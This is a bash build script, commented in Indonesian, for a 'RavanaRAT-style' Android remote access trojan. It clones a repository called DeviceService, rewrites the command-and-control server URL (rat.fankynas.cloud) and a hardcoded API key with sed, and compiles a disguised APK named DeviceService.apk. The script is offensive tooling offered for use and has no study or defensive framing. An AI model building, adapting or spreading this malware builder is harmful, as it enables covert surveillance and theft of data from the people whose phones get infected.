#!/bin/bash
# =====================================================
# RavanaRAT-style APK Builder for rat.fankynas.cloud
# =====================================================

set -e  # Hentikan script jika ada error

# Warna output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}┌─────────────────────────────────────────────────┐${NC}"
echo -e "${BLUE}│      RavanaRAT-Style APK Builder v1.0          │${NC}"
echo -e "${BLUE}│         for rat.fankynas.cloud                 │${NC}"
echo -e "${BLUE}└─────────────────────────────────────────────────┘${NC}"

# 1. Inisialisasi direktori
BUILDER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SOURCE_DIR="$BUILDER_DIR/source"
OUTPUT_DIR="$BUILDER_DIR/output"
LOG_DIR="$BUILDER_DIR/logs"
APK_OUTPUT="$OUTPUT_DIR/DeviceService.apk"

mkdir -p "$SOURCE_DIR" "$OUTPUT_DIR" "$LOG_DIR"
LOG_FILE="$LOG_DIR/build_$(date +%Y%m%d_%H%M%S).log"
exec > >(tee -a "$LOG_FILE") 2>&1

echo -e "${YELLOW}[✓] Build started at $(date)${NC}"

# 2. Cek JDK
if ! command -v java &> /dev/null; then
    echo -e "${RED}[✗] Java not found. Install JDK 11 or 17.${NC}"
    exit 1
fi
JAVA_VERSION=$(java -version 2>&1 | head -1 | cut -d'"' -f2 | cut -d'.' -f1)
if [[ "$JAVA_VERSION" -lt 11 ]]; then
    echo -e "${RED}[✗] Java version $JAVA_VERSION < 11. Upgrade to JDK 11+.${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Java version: $JAVA_VERSION${NC}"

# 3. Cek Android SDK
if [ -z "$ANDROID_HOME" ]; then
    echo -e "${YELLOW}[!] ANDROID_HOME not set. Trying common paths...${NC}"
    if [ -d "$HOME/Android/Sdk" ]; then
        export ANDROID_HOME="$HOME/Android/Sdk"
    elif [ -d "/usr/local/android-sdk" ]; then
        export ANDROID_HOME="/usr/local/android-sdk"
    else
        echo -e "${RED}[✗] ANDROID_HOME not found. Please install Android SDK.${NC}"
        echo -e "${YELLOW}Hint: sdkmanager \"build-tools;35.0.0\" \"platforms;android-35\"${NC}"
        exit 1
    fi
    echo -e "${GREEN}[✓] ANDROID_HOME set to $ANDROID_HOME${NC}"
fi

if [ ! -f "$ANDROID_HOME/build-tools/35.0.0/aapt" ]; then
    echo -e "${RED}[✗] build-tools 35.0.0 not found. Run: sdkmanager \"build-tools;35.0.0\"${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Android SDK build-tools found${NC}"

# 4. Clone atau update source code
echo -e "${YELLOW}[→] Preparing source code...${NC}"
cd "$SOURCE_DIR"

if [ ! -d "DeviceService" ]; then
    echo -e "${YELLOW}[→] Cloning repository...${NC}"
    git clone https://github.com/fanky86/DeviceService.git DeviceService
else
    echo -e "${YELLOW}[→] Pulling latest changes...${NC}"
    cd DeviceService && git pull && cd ..
fi

cd DeviceService

# 5. Baca konfigurasi dari builder/config.json (opsional)
if [ -f "$BUILDER_DIR/config.json" ]; then
    echo -e "${YELLOW}[→] Loading custom configuration...${NC}"
    SERVER_URL=$(jq -r '.server_url' "$BUILDER_DIR/config.json")
    API_KEY=$(jq -r '.api_key' "$BUILDER_DIR/config.json")
    echo -e "${GREEN}[✓] Server: $SERVER_URL${NC}"
    echo -e "${GREEN}[✓] API Key: ${API_KEY:0:10}...${NC}"
    
    # Update konfigurasi di source code
    find app/src/main -type f -exec sed -i "s|https://rat.fankynas.cloud|$SERVER_URL|g" {} \;
    find app/src/main -type f -exec sed -i "s|fanky_super_secret_key_2026|$API_KEY|g" {} \;
fi

# 6. Beri izin gradlew
chmod +x gradlew

# 7. Build APK
echo -e "${YELLOW}[→] Building APK (this may take 2-5 minutes)...${NC}"
./gradlew clean assembleDebug --no-daemon

# 8. Copy hasil APK ke output
if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
    cp "app/build/outputs/apk/debug/app-debug.apk" "$APK_OUTPUT"
    echo -e "${GREEN}[✓] APK built: $APK_OUTPUT${NC}"
else
    echo -e "${RED}[✗] Build failed: APK not found${NC}"
    exit 1
fi

# 9. Tampilkan informasi hasil
APK_SIZE=$(du -h "$APK_OUTPUT" | cut -f1)
echo -e "${GREEN}┌─────────────────────────────────────────────────┐${NC}"
echo -e "${GREEN}│              Build completed!                   │${NC}"
echo -e "${GREEN}├─────────────────────────────────────────────────┤${NC}"
echo -e "${GREEN}│  APK: $APK_OUTPUT${NC}"
echo -e "${GREEN}│  Size: $APK_SIZE${NC}"
echo -e "${GREEN}│  Log: $LOG_FILE${NC}"
echo -e "${GREEN}└─────────────────────────────────────────────────┘${NC}"
